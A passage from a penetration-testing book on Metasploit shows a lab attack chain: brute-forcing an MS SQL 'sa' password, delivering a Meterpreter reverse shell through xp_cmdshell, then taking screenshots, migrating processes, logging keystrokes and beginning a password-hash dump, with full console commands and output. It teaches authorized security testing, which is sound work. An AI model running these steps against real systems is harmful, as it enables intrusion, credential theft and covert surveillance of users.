style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">no</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:186pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">File containing users and passwords</p></td></tr><tr style="height:11pt"><td style="width:77pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:63pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:186pt"><p class="s28" style="padding-left: 8pt;text-indent: 0pt;line-height: 10pt;text-align: left;">separated by space, one pair per line</p></td></tr><tr style="height:11pt"><td style="width:77pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">USER_FILE</p></td><td style="width:63pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">no</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:186pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">File containing usernames, one per line</p></td></tr><tr style="height:10pt"><td style="width:77pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">VERBOSE</p></td><td style="width:63pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">true</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:186pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">Whether to print output for all attempts</p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 14pt;text-align: left;">msf auxiliary(mssql_login) &gt; <span class="s24">set  PASS_FILE  /pentest/exploits/fasttrack/bin/dict/wordlist.txt  </span><span class="s30">8</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">PASS_FILE =&gt; /pentest/exploits/fasttrack/bin/dict/wordlist.txt</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(mssql_login) &gt; <span class="s24">set RHOSTS 192.168.33.130</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">RHOSTS =&gt; 192.168.33.130</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(mssql_login) &gt; <span class="s24">set THREADS 10</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">THREADS =&gt; 10</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(mssql_login) &gt; <span class="s24">set verbose false</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">verbose =&gt; false</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">msf auxiliary(mssql_login) &gt; <span class="s24">exploit</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 12pt;text-align: left;">[+] 192.168.33.130:1433 - MSSQL - successful login &#39;sa&#39; : <span class="s24">&#39;password123&#39;</span><span class="s30">@</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">[*] Scanned 1 of 1 hosts (100% complete)</p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Auxiliary module execution completed</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_228.png"/></span></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 17pt;line-height: 69%;text-align: justify;">We select the <span class="s19">mssql_login </span>module at <span class="s32">O </span>and point it to the default password word list from Fast-Track at <span class="s32">8</span>. (We discuss Fast-Track in more detail in Chap- ter 11.) At <span class="s32">@</span>, we have successfully guessed the <span class="s19">sa </span>password: <span class="s19">password123</span>.</p><p class="s22" style="padding-top: 8pt;padding-left: 90pt;text-indent: -36pt;text-align: left;">NOTE <span class="s19">Fast-Track is a tool created by one of the authors of this book that leverages multiple attacks, exploits, and the Metasploit Framework for payload delivery. One of Fast- Track’s features is its ability to use a brute-forcer to attack and compromise MS SQL automatically.</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark198">The xp_cmdshell</a><a name="bookmark226">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">By running MS SQL from the <span class="s19">sa </span>account, we can execute the stored proce- dure <span class="s25">xp_cmdshell</span>, which lets us interact with the underlying operating system and execute commands. The <span class="s25">xp_cmdshell </span>is a built-in stored procedure that ships by default with SQL Server. You can call this stored procedure and have it query and execute underlying operating system calls directly with MS SQL. Think of it as a kind of superuser command prompt that allows you to run anything you want on the operating system. When we gain access to the <span class="s19">sa </span>account, we find that the MS SQL server is generally running with SYSTEM- level permissions, which allows us full access as an administrator to both MS SQL and the machine itself.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">To get a payload onto the system, we’ll interact with the <span class="s25">xp_cmdshell</span>, add a local administrator, and deliver the payload through an executable. David Kennedy and Joshua Drake (<span class="s19">jduck</span>), have written a module (<span class="s19">mssql_payload</span>) that can be used to deliver any Metasploit payload through <span class="s25">xp_cmdshell</span>:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_229.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 12pt;text-align: left;">msf &gt; <span class="s24">use windows/mssql/mssql_payload </span><span class="s30">O</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">msf exploit(mssql_payload) &gt; <span class="s24">show options</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Module options:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:49.2205pt" cellspacing="0"><tr style="height:16pt"><td style="width:60pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Name</p></td><td style="width:63pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Current Setting</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Required</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:202pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Description</p></td></tr><tr style="height:15pt"><td style="width:60pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">PASSWORD</p></td><td style="width:63pt;border-top-style:dashed;border-top-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">no</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:202pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">The password for the specified username</p></td></tr><tr style="height:11pt"><td style="width:60pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">RHOST</p></td><td style="width:63pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:202pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The target address</p></td></tr><tr style="height:11pt"><td style="width:60pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">RPORT</p></td><td style="width:63pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">1433</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:202pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The target port</p></td></tr><tr style="height:11pt"><td style="width:60pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">USERNAME</p></td><td style="width:63pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">sa</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">no</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:202pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The username to authenticate as</p></td></tr><tr style="height:11pt"><td style="width:60pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">UseCmdStager</p></td><td style="width:63pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">true</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">no</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:202pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Wait for user input before returning from exploit</p></td></tr><tr style="height:10pt"><td style="width:60pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">VERBOSE</p></td><td style="width:63pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">false</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">no</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:202pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">Enable verbose output</p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><span><img width="11" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_230.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><span><img width="23" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_231.png"/></span></p><p class="s25" style="padding-left: 49pt;text-indent: -12pt;line-height: 193%;text-align: left;">Exploit target: Id Name</p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0 Automatic</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 13pt;text-align: left;">msf exploit(mssql_payload) &gt; <span class="s24">set payload windows/meterpreter/reverse_tcp </span><span class="s30">8</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">payload =&gt; windows/meterpreter/reverse_tcp</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(mssql_payload) &gt; <span class="s24">set LHOST 192.168.33.129</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">LHOST =&gt; 192.168.33.129</p><p class="s25" style="padding-top: 3pt;padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(mssql_payload) &gt; <span class="s24">set LPORT 443</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">LPORT =&gt; 443</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(mssql_payload) &gt; <span class="s24">set RHOST 192.168.33.130</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">RHOST =&gt; 192.168.33.130</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(mssql_payload) &gt; <span class="s24">set PASSWORD password123</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">PASSWORD =&gt; password123</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(mssql_payload) &gt; <span class="s24">exploit</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: justify;">[*] Started reverse handler on 192.168.33.129:443</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: justify;">[*] Command Stager progress - 2.78% done (1494/53679 bytes) [*] Command Stager progress - 5.57% done (2988/53679 bytes) [*] Command Stager progress - 8.35% done (4482/53679 bytes)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 36pt;text-indent: 0pt;text-align: justify;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Command Stager progress - 97.32% done (52239/53679 bytes) [*] Sending stage (748032 bytes)</p><p class="s25" style="padding-top: 1pt;padding-bottom: 3pt;padding-left: 36pt;text-indent: 0pt;line-height: 83%;text-align: left;">[*] Meterpreter session 1 opened (192.168.33.129:443 -&gt; 192.168.33.130:1699) meterpreter &gt; <span class="s30">@</span></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_232.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 82%;text-align: left;">After selecting the <span class="s19">mssql_payload </span>module and setting our payload to <span class="s25">meterpreter </span>at <span class="s32">8</span>, all we need to do is set the standard options before starting our Meterpreter session. We’ve succeeded in opening a Meterpreter session at <span class="s32">@ </span>on the target machine.</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 10pt;text-align: left;">To recap, in the attack described here, we used the <span class="s19">mssql_ping </span>module</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">to guess the MS SQL <span class="s19">sa </span>password, which we discovered is <span class="s19">password123</span>. We then leveraged the <span class="s19">mssql_payload </span>module to communicate with MS SQL and upload a Meterpreter shell through MS SQL, and the shell was presented to us, thereby completely compromising the system. Once the Meterpreter shell is presented, we know that the exploit was successful and we can continue with post exploitation on this system.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark199">Basic Meterpreter Commands</a><a name="bookmark227">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Having successfully compromised the target and gained a Meterpreter console on the system, we can glean more information with some basic Meterpreter commands. Use the <span class="s25">help </span>command at any point for more information on how to use Meterpreter.</p><p class="s23" style="padding-top: 9pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Capturing a Screenshot</p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Meterpreter’s <span class="s25">screenshot </span>command will export an image of the active user’s desktop and save it to the <span class="s19">/opt/metasploit3/msf3/ </span>directory, as shown in Figure 6-1.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_233.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">meterpreter &gt; <span class="s24">screenshot</span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Screenshot saved to: /opt/metasploit3/msf3/yVHXaZar.jpeg</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_234.png"/></span></p><p style="padding-top: 7pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">Desktop screen captures offer a great way to learn about a target system.</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">For example, in Figure 6-1, we can see that McAfee antivirus software is installed and running, which means we’ll need to be cautious about what we upload to the system. (Chapter 7 discusses antivirus evasion in more detail.)</p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="437" height="246" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_235.gif"/></span></p><p class="s29" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Figure 6-1: Meterpreter-captured screenshot</p><p class="s23" style="padding-top: 9pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">sysinfo</p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Another command we can specify is <span class="s25">sysinfo</span>, which will tell us the platform on which the system is running, as shown here:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_236.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">meterpreter &gt; <span class="s24">sysinfo</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Computer: IHAZSECURITY</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">OS : Windows XP (Build 2600, Service Pack 2). Arch : x86</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Language: en_US</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_237.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">As you can see, this system is running Windows XP Service Pack 2. Because SP2 is end of life, we can assume that we can find a ton of holes on this system.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark200">Capturing Keystrokes</a><a name="bookmark228">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Now we’ll grab the password hash values from this system, which can either be cracked or used in an attack. We’ll also start <span class="s19">keystroke logging </span>(recording keystrokes) on the remote system. But first, let’s list the running processes on the target system with the <span class="s25">ps </span>command.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_238.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">meterpreter &gt; <span class="s24">ps </span><span class="s30">O</span></p><p class="s25" style="padding-top: 7pt;padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Process list</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">============</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:37.9001pt" cellspacing="0"><tr style="height:10pt"><td style="width:20pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">PID</p></td><td style="width:78pt"><p class="s28" style="padding-left: 5pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Name</p></td><td style="width:30pt"><p class="s28" style="padding-left: 9pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Arch</p></td><td style="width:35pt"><p class="s28" style="padding-left: 3pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Session</p></td><td style="width:100pt"><p class="s28" style="padding-left: 3pt;text-indent: 0pt;line-height: 9pt;text-align: left;">User</p></td><td style="width:39pt"><p class="s28" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">Path</p></td></tr><tr style="height:11pt"><td style="width:20pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">---</p></td><td style="width:78pt"><p class="s28" style="padding-left: 5pt;text-indent: 0pt;line-height: 10pt;text-align: left;">----</p></td><td style="width:30pt"><p class="s28" style="padding-left: 9pt;text-indent: 0pt;line-height: 10pt;text-align: left;">----</p></td><td style="width:35pt"><p class="s28" style="padding-left: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">-------</p></td><td style="width:100pt"><p class="s28" style="padding-left: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">----</p></td><td style="width:39pt"><p class="s28" style="padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: right;">----</p></td></tr><tr style="height:11pt"><td style="width:20pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0</p></td><td style="width:78pt"><p class="s28" style="padding-left: 5pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[System Process]</p></td><td style="width:30pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:35pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:100pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:39pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:10pt"><td style="width:20pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">4</p></td><td style="width:78pt"><p class="s28" style="padding-left: 5pt;text-indent: 0pt;line-height: 9pt;text-align: left;">System</p></td><td style="width:30pt"><p class="s28" style="padding-left: 9pt;text-indent: 0pt;line-height: 9pt;text-align: left;">x86</p></td><td style="width:35pt"><p class="s28" style="padding-left: 3pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0</p></td><td style="width:100pt"><p class="s28" style="padding-left: 3pt;text-indent: 0pt;line-height: 9pt;text-align: left;">NT AUTHORITY\SYSTEM</p></td><td style="width:39pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p class="s25" style="padding-top: 3pt;padding-left: 40pt;text-indent: 0pt;line-height: 11pt;text-align: left;">1476 spoolsv.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\</p><p class="s25" style="padding-left: 52pt;text-indent: 0pt;line-height: 10pt;text-align: left;">system32\spoolsv.exe</p><p class="s25" style="padding-left: 52pt;text-indent: -11pt;line-height: 80%;text-align: left;">1668 explorer.exe <span class="s30">8 </span>x86 0 IHAZSECURITY\Administrator C:\WINDOWS\ Explorer.EXE</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 52pt;text-indent: -11pt;text-align: left;">4032 notepad.exe x86 0 IHAZSECURITY\Administrator C:\WINDOWS\ system32\notepad.exe</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 14pt;text-align: left;">meterpreter &gt; <span class="s24">migrate 1668 </span><span class="s30">@</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">[*] Migrating to 1668...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Migration completed successfully.</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 12pt;text-align: left;">meterpreter &gt; <span class="s24">run post/windows/capture/keylog_recorder </span><span class="s30">O</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">[*] Executing module against V-MAC-XP</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Starting the keystroke sniffer...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 92%;text-align: left;">[*] Keystrokes being saved in to /root/.msf3/loot/ 20110324171334_default_192.168.1.195_host.windows.key_179703.txt [*] Recording keystrokes...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Saving last few keystrokes...</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 14pt;text-align: left;">root@bt:~# <span class="s24">cat /root/.msf3/loot/20110324171334_default_192.168.1.195_host.windows.key_179703.txt </span><span class="s30">@</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Keystroke log started at Thu Mar 24 17:13:34 -0600 2011</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">administrator password &lt;Back&gt; &lt;Back&gt; &lt;Back&gt; &lt;Back&gt; &lt;Back&gt; &lt;Back&gt; &lt;Back&gt; &lt;Tab&gt; password123!!</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_239.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;line-height: 76%;text-align: left;">Executing <span class="s25">ps </span>at <span class="s32">O </span>provides a list of running processes, including <span class="s19">explorer.exe </span><span class="s32">8</span>. At <span class="s32">@ </span>we issue the <span class="s25">migrate </span>command to move our session into the <span class="s19">explorer.exe </span>process space. Once that move is complete, we start the <span class="s19">keylog_recorder </span>module at <span class="s32">O</span>, stopping it after some time with <span class="s9">CTRL</span>-C, and finally, at <span class="s32">@</span>, in another terminal window, we dump the contents of the keystroke logger to see what we’ve caught.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark201">Dumping Usernames and Passwords</a><a name="bookmark229">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">In the preceding example, we grabbed password hashes by logging what a user typed. We can also use Meterpreter to obtain the usernames and pass- word hashes on a local file system without the use of keyloggers.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark202">Extracting the Password Hashes</a><a name="bookmark230">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">In this attack, we’ll leverage the <span class="s19">hashdump </span>post exploitation module in Meter- preter to extract the username and password hashes from the system. Microsoft typically stores hashes on LAN Manager (LM), NT LAN Manager (NTLM), and NT LAN Manager v2 (NTLMv2).</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">In the case of LM, for example, when a use enters a password for the first time or changes a password, the password is assigned a hash value. Depend- ing on the hash value length, the password can be split into seven-character hashes. For example, if the password is <span class="s19">password123456</span>, the hash value could be stored as <span class="s19">passwor </span>and <span class="s19">d123456</span>, so an attacker would simply need to crack</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">a 7-character password instead of a 14-character one. In NTLM, regardless of the password size, <span class="s19">password123456 </span>would be stored as a hash value of <span class="s19">password123456</span>.</p><p class="s22" style="padding-top: 9pt;padding-left: 90pt;text-indent: -36pt;text-align: left;">NOTE <span class="s19">We’re using a super complex password here that we would not be able to crack in a rea- sonable amount of time. Our password is larger than the 14-character maximum that LM supports, so it has automatically converted itself to an NTLM-based hash value. Even with rainbow tables or a super powerful cracking machine, it would take a signif- icant amount of time to crack these passwords.</span></p><p style="padding-top: 5pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">In the following code, we extract a username and password hash for the <span class="s19">Administrator </span>user account with UID 500 (the Windows Administrator system default). The strings that follow <span class="s25">Administrator:500 </span>are two hashes of the <span class="s19">Administrator </span>password. This shows an example of a simple extract of a user- name and password hashes. Shortly, we will extract our own username and password hashes from our Windows XP system.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="501" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_240.png"/></span></p><p class="s25" style="padding-bottom: 2pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">Administrator:500:e52cac67419a9a22cbb699e2fdfcc59e <span 